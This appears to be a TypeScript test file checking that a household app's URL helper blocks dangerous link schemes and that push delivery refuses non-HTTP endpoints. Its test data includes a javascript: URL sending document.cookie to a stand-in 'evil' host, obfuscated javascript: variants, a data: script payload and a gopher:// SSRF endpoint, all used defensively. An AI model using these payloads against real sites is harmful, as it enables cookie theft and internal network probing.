import { migrate } from 'drizzle-orm/better-sqlite3/migrator'
import webpush from 'web-push'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import type { Db } from '../../server/db/client'
import { createDb, setDb } from '../../server/db/client'
import { households, profiles, pushSubscriptions, wishlistItems } from '../../server/db/schema'
import { defaultHouseholdSettings } from '../../server/db/schema/household'
import { sendToSubscription } from '../../server/services/push/send'
import { createWishlist, getWishlist } from '../../server/services/wishlists/store'
import { safeExternalUrl } from '../../app/utils/safeUrl'

/**
 * Layer two: nothing dangerous gets RENDERED.
 *
 * Tightening the schema does not clean the database. Every wish-list item and
 * recipe saved while `z.string().url()` was the rule still holds whatever it
 * accepted, and those rows go straight into an `href`. So the check runs again
 * at the render site, and this is the test that says it may not be removed on
 * the grounds that "the schema handles it now".
 */

describe('safeExternalUrl', () => {
  it.each([
    'javascript:fetch("//evil/"+document.cookie)',
    'JavaScript:alert(1)',
    'jAvAsCrIpT:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'file:///data/board.db',
    'vbscript:msgbox(1)',
  ])('yields nothing for %s, so no href is emitted', (value) => {
    expect(safeExternalUrl(value)).toBeUndefined()
  })

  /**
   * HTML strips tabs, newlines and leading control characters out of a URL
   * before it decides the scheme, so a value that does not LOOK like
   * javascript: can still navigate as one. The helper must not be fooled by
   * the same trick, in either direction.
   */
  it.each([
    'java\nscript:alert(1)',
    'java\tscript:alert(1)',
    'javascript:alert(1)',
    '  javascript:alert(1)  ',
  ])('is not fooled by %j', (value) => {
    expect(safeExternalUrl(value)).toBeUndefined()
  })

  it('yields nothing for a relative or unparseable value', () => {
    // A protocol-relative or bare path could otherwise be resolved against
    // whatever page it lands on, which is not something we can vouch for.
    expect(safeExternalUrl('/uploads/x.jpg')).toBeUndefined()
    expect(safeExternalUrl('not a url')).toBeUndefined()
    expect(safeExternalUrl('')).toBeUndefined()
    expect(safeExternalUrl(null)).toBeUndefined()
    expect(safeExternalUrl(undefined)).toBeUndefined()
  })

  it.each([
    'https://www.lego.com/product/12345',
    'http://192.168.1.10:8080/photo.jpg', // the family's own NAS
    'https://example.com/x?a=1&b=2#frag',
  ])('passes %s through untouched', (value) => {
    expect(safeExternalUrl(value)).toBe(value)
  })

  it('trims a pasted link rather than rejecting it', () => {
    expect(safeExternalUrl('  https://example.com/x  ')).toBe('https://example.com/x')
  })

  /**
   * The returned string is what the URL parser inspected, not the caller's
   * raw text — otherwise a value could be validated in one form and navigated
   * in another.
   */
  it('returns the parsed form of the URL', () => {
    expect(safeExternalUrl('https://example.com')).toBe('https://example.com/')
  })
})

describe('a wish-list row that predates the schema fix', () => {
  let db: Db
  let householdId: string
  let kid: string

  beforeEach(() => {
    db = createDb(':memory:')
    migrate(db, { migrationsFolder: 'drizzle' })
    setDb(db)

    householdId = db.insert(households).values({
      name: 'Betts', passwordHash: 'x', timezone: 'America/Boise', icsToken: 'tok',
      settings: defaultHouseholdSettings,
    }).returning().get().id
    kid = db.insert(profiles).values({
      householdId, name: 'Emma', color: '#22c55e', role: 'kid',
    }).returning().get().id
  })

  it('is still served by the API, but cannot become a live link', () => {
    const list = createWishlist(db, householdId, { title: 'Birthday' }, kid)
    // Written straight to the table: this is a row that already exists in a
    // running household's database, saved before the URL scheme was pinned.
    // No schema change can retroactively clean it.
    db.insert(wishlistItems).values({
      wishlistId: list.id,
      name: 'Free robux',
      url: 'javascript:fetch("//evil/"+document.cookie)',
      createdByProfileId: kid,
    }).run()

    const item = getWishlist(db, householdId, list.id).items![0]!
    expect(item.url).toBe('javascript:fetch("//evil/"+document.cookie)')

    // The page renders `safeExternalUrl(item.url)`, never `item.url` — so the
    // anchor gets no href and the item shows as plain text.
    expect(safeExternalUrl(item.url)).toBeUndefined()
  })

  /**
   * The same "a schema does not clean the table" problem, on the server side.
   *
   * A push subscription is not rendered — it is DIALLED, from inside the
   * container, every time a reminder goes out. web-push does not vet the
   * scheme: given `gopher://127.0.0.1:11211/_x` it opens a connection to that
   * host and port. So the row is re-checked where it is used, not only where
   * it was accepted.
   */
  it('a push subscription saved before the fix is never dialled', async () => {
    const spy = vi.spyOn(webpush, 'sendNotification').mockResolvedValue({} as never)
    try {
      const good = db.insert(pushSubscriptions).values({
        householdId, profileId: kid, p256dh: 'p', auth: 'a',
        endpoint: 'https://fcm.googleapis.com/fcm/send/dGhpcy1pcy1hLXRva2Vu',
      }).returning().get()
      // A real endpoint still goes out — this proves the spy is wired up, so
      // the assertion below means "refused", not "nothing happens here".
      expect(await sendToSubscription(db, good, { title: 'Dishes' })).toBe(true)
      expect(spy).toHaveBeenCalledTimes(1)

      spy.mockClear()
      for (const endpoint of ['gopher://127.0.0.1:11211/_x', 'file:///data/board.db']) {
        const bad = db.insert(pushSubscriptions).values({
          householdId, profileId: kid, endpoint, p256dh: 'p', auth: 'a',
        }).returning().get()
        expect(await sendToSubscription(db, bad, { title: 'Dishes' })).toBe(false)
        expect(spy).not.toHaveBeenCalled()
      }
    }
    finally {
      spy.mockRestore()
    }
  })
})
